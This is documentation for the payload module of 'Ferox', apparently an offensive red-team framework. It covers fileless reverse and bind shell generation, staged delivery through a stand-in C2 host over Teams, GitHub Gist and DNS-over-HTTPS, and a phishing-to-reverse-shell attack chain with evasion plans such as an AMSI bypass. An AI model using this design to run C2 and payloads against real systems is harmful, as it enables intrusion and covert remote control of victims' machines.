# Smart Payload System (Phase 4)

The Smart Payload System (SPS) is the core attack engine of Ferox, providing encrypted, fileless payload generation with multi-stage architecture and cloud-native C2 integration.

## Overview

Phase 4 introduces a modern payload generation framework designed for:

- **Fileless Execution**: Memory-only payloads that never touch disk
- **Strong Encryption**: AES-256-GCM encryption with HKDF key derivation
- **Multi-Stage Delivery**: Stage-1 stagers that fetch encrypted Stage-2 payloads
- **C2 Integration**: Direct integration with Teams, GitHub Gist, DNS-over-HTTPS channels
- **Cross-Platform**: Support for Windows, Linux, and macOS targets

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Smart Payload System                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────────┐    ┌─────────────────┐                │
│  │  PayloadEngine  │───▶│   Crypto Layer  │                │
│  │                 │    │  (AES-GCM/HKDF) │                │
│  └────────┬────────┘    └─────────────────┘                │
│           │                                                 │
│           ▼                                                 │
│  ┌─────────────────────────────────────────┐               │
│  │           Payload Generators            │               │
│  ├─────────────┬─────────────┬─────────────┤               │
│  │  ReverseTCP │  BindShell  │   Stager    │               │
│  └─────────────┴─────────────┴─────────────┘               │
│           │                                                 │
│           ▼                                                 │
│  ┌─────────────────────────────────────────┐               │
│  │         C2 Delivery Adapters            │               │
│  ├──────┬──────┬──────┬──────┬─────────────┤               │
│  │Teams │GitHub│ DNS  │ HTTP │  Direct TCP │               │
│  └──────┴──────┴──────┴──────┴─────────────┘               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## Components

### PayloadEngine (`src/core/payload_engine.rs`)

The core engine responsible for payload generation and encryption.

```rust
use ferox::core::payload_engine::{PayloadEngine, TargetOS, StagerConfig};

// Create engine with passphrase
let mut engine = PayloadEngine::from_passphrase("my-secret-key")?;

// Configure target
engine.set_target_os(TargetOS::Windows);
engine.set_architecture(Architecture::X64);

// Generate encrypted reverse TCP payload
let payload = engine.generate_reverse_tcp("192.168.1.100", 4444)?;

println!("Payload size: {} bytes", payload.metadata.size);
println!("Encrypted: {}", payload.metadata.encrypted);
println!("Base64: {}", payload.base64);
```

#### Key Features

| Feature | Description |
|---------|-------------|
| `generate_reverse_tcp()` | Creates a reverse TCP shell payload |
| `generate_bind_shell()` | Creates a bind shell payload |
| `generate_stager()` | Creates a Stage-1 stager for multi-stage delivery |
| `generate_stage2()` | Creates the Stage-2 payload for C2 delivery |
| `encrypt_payload()` | Encrypts arbitrary data with AES-256-GCM |
| `decrypt_payload()` | Decrypts payload data |
| `derive_session_key()` | Derives unique keys per session |

### FilelessRevTcp Module (`src/modules/payloads/rev_tcp_fileless.rs`)

A console-integrated module for generating fileless reverse TCP payloads.

#### Module Options

| Option | Required | Default | Description |
|--------|----------|---------|-------------|
| `LHOST` | Yes | - | Listener host address |
| `LPORT` | No | 4444 | Listener port |
| `TARGET_OS` | No | any | Target OS (windows/linux/macos/any) |
| `ARCHITECTURE` | No | any | Target arch (x64/x86/arm64/arm/any) |
| `ENCRYPTION_KEY` | No | auto | Custom encryption passphrase |
| `STAGED` | No | false | Enable multi-stage delivery |
| `C2_URL` | No | - | C2 URL for staged delivery |
| `C2_CHANNEL` | No | http | C2 channel type |
| `OUTPUT_FORMAT` | No | base64 | Output format (base64/hex/raw) |
| `SAFE_MODE` | No | true | Safe mode for testing |

#### Console Usage

```bash
# Start Ferox console
ferox console

# Use the module
ferox> use payloads/rev_tcp_fileless

# Set options
ferox(payloads/rev_tcp_fileless)> set LHOST 192.168.1.100
ferox(payloads/rev_tcp_fileless)> set LPORT 4444
ferox(payloads/rev_tcp_fileless)> set TARGET_OS windows

# Show current configuration
ferox(payloads/rev_tcp_fileless)> options

# Generate payload
ferox(payloads/rev_tcp_fileless)> run
```

#### Staged Delivery Example

```bash
ferox(payloads/rev_tcp_fileless)> set LHOST 192.168.1.100
ferox(payloads/rev_tcp_fileless)> set STAGED true
ferox(payloads/rev_tcp_fileless)> set C2_URL https://c2.example.com/beacon
ferox(payloads/rev_tcp_fileless)> set C2_CHANNEL teams
ferox(payloads/rev_tcp_fileless)> run

[*] Staged payload generated:
    Stage-1: 2048 bytes (stager)
    Stage-2: 4096 bytes (payload)
    Stage-2 Key: a1b2c3d4...
    C2 URL: https://c2.example.com/beacon
```

## Multi-Stage Architecture

The Smart Payload System supports a two-stage delivery architecture:

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Stage-1    │────▶│   C2 Server  │────▶│   Stage-2    │
│   Stager     │     │              │     │   Payload    │
└──────────────┘     └──────────────┘     └──────────────┘
      │                    │                    │
      ▼                    ▼                    ▼
  Small dropper      Encrypted payload     Full reverse
  fetches Stage-2    stored in C2          shell executes
  from C2            (Teams/GitHub/DNS)    in memory
```

### Stage-1 (Stager)

- Minimal footprint (~2-4 KB)
- Fetches encrypted Stage-2 from C2 URL
- Decrypts using stage-specific key
- Executes Stage-2 in memory

### Stage-2 (Payload)

- Full reverse shell functionality
- Encrypted with AES-256-GCM
- Different key from Stage-1
- Never written to disk

## C2 Channel Integration

### Teams Tunnel Integration

```rust
use ferox::core::payload_engine::{PayloadEngine, C2PayloadDelivery};

let engine = PayloadEngine::from_passphrase("key")?;
let delivery = C2PayloadDelivery::new(engine);

// Prepare payload for Teams delivery
let teams_data = delivery.for_teams("192.168.1.100", 4444)?;
// Returns: payload_base64, checksum, size, encrypted
```

### GitHub Gist Integration

```rust
let gist_data = delivery.for_github_gist("192.168.1.100", 4444)?;
// Returns: content (base64), filename, description
```

### DNS-over-HTTPS Integration

```rust
let config = StagerConfig {
    c2_url: "https://doh.example.com/dns-query".to_string(),
    c2_channel: C2Channel::DnsOverHttps,
    ..Default::default()
};

let dns_data = delivery.for_dns_over_https(&config)?;
// Returns: total_chunks, chunk_0, chunk_1, ...
```

## Encryption Details

### Key Derivation

Keys are derived using HKDF-SHA256:

```
Seed Key + Salt → HKDF-SHA256 → [Encryption Key (256-bit), HMAC Key (256-bit)]
```

### Payload Encryption

```
Plaintext + AAD → AES-256-GCM → [Nonce (12 bytes) | Ciphertext | Tag (16 bytes)]
```

### Session Keys

Each session can have unique derived keys:

```rust
let session_key = engine.derive_session_key("session-12345")?;
// Deterministic: same session ID always produces same key
```

## Safe Mode

By default, the payload engine operates in **safe mode**, generating reference implementations that demonstrate functionality without producing actual exploit code.

### Safe Mode Behavior

- Generates human-readable script templates
- Includes metadata about what the production payload would do
- Safe for development, testing, and demonstrations

### Production Mode

To generate actual payloads (requires explicit authorization):

```rust
let mut engine = PayloadEngine::from_passphrase("key")?;
engine.enable_production_mode();  // ⚠️ Requires authorization
```

```bash
# In console
ferox(payloads/rev_tcp_fileless)> set SAFE_MODE false
[!] WARNING: Disabling safe mode. Ensure you have authorization.
```

## Platform-Specific Templates

### Windows

- PowerShell-based reverse shells
- Base64-encoded for `-enc` execution
- Supports Teams and HTTP stagers

### Linux

- Python and Bash-based payloads
- Uses `/dev/tcp` when available
- Falls back to netcat or Python sockets

### macOS

- Python-based (Bash `/dev/tcp` not available)
- Uses `/bin/zsh` as default shell

## Attack Chain Example

Complete attack chain using Teams C2:

```
1. Operator generates staged payload:
   - Stage-1 stager with Teams C2 integration
   - Stage-2 reverse TCP payload

2. Stage-2 uploaded to Teams meeting description (encrypted)

3. Delivery via phishing/initial access:
   - Victim executes Stage-1 stager
   - Stager authenticates to Graph API
   - Fetches encrypted Stage-2 from meeting

4. Stage-2 execution:
   - Decrypts payload in memory
   - Establishes reverse connection
   - Blends with legitimate Teams traffic
```

## Security Considerations

### Authorization Requirements

- All payload generation requires proper authorization context
- Operations are logged to the audit system
- Safe mode is enabled by default

### Audit Logging

All payload operations are logged:

```
[2024-01-15T10:30:00Z] PAYLOAD_GENERATED type=reverse_tcp target=192.168.1.100:4444 os=windows safe_mode=true
[2024-01-15T10:31:00Z] STAGER_GENERATED c2_url=https://c2.example.com c2_channel=teams
```

### Best Practices

1. Always use safe mode during development
2. Use unique encryption keys per engagement
3. Rotate session keys regularly
4. Monitor audit logs for unauthorized usage

## API Reference

### PayloadEngine

```rust
impl PayloadEngine {
    // Creation
    pub fn new(seed_key: &[u8]) -> Result<Self>
    pub fn from_passphrase(passphrase: &str) -> Result<Self>

    // Configuration
    pub fn set_target_os(&mut self, os: TargetOS)
    pub fn set_architecture(&mut self, arch: Architecture)
    pub fn enable_production_mode(&mut self)
    pub fn is_safe_mode(&self) -> bool

    // Payload Generation
    pub fn generate_reverse_tcp(&self, host: &str, port: u16) -> Result<PayloadResult>
    pub fn generate_bind_shell(&self, port: u16) -> Result<PayloadResult>
    pub fn generate_stager(&self, config: &StagerConfig) -> Result<PayloadResult>
    pub fn generate_stage2(&self, host: &str, port: u16, key: &str) -> Result<PayloadResult>

    // Encryption
    pub fn encrypt_payload(&self, data: &[u8]) -> Result<Vec<u8>>
    pub fn decrypt_payload(&self, encrypted: &[u8]) -> Result<Vec<u8>>
    pub fn derive_session_key(&self, session_id: &str) -> Result<[u8; 32]>
}
```

### PayloadResult

```rust
pub struct PayloadResult {
    pub data: Vec<u8>,          // Raw payload bytes
    pub base64: String,         // Base64-encoded payload
    pub hex: String,            // Hex-encoded payload
    pub metadata: PayloadMetadata,
    pub stage: StageInfo,
}
```

### StagerConfig

```rust
pub struct StagerConfig {
    pub c2_url: String,
    pub c2_channel: C2Channel,
    pub stage2_key: Option<String>,
    pub user_agent: Option<String>,
    pub proxy: Option<String>,
    pub sleep_time: u32,
    pub max_retries: u32,
}
```

## Testing

Run the integration tests:

```bash
cargo test --test integration_payload
```

Run unit tests for payload engine:

```bash
cargo test payload_engine
```

## Future Enhancements

Phase 4.1 (Planned):
- [ ] Additional C2 channels (Slack, Discord)
- [ ] Shellcode generation for native execution
- [ ] Payload encoding/obfuscation options
- [ ] AMSI bypass integration (Windows)
- [ ] Process injection templates
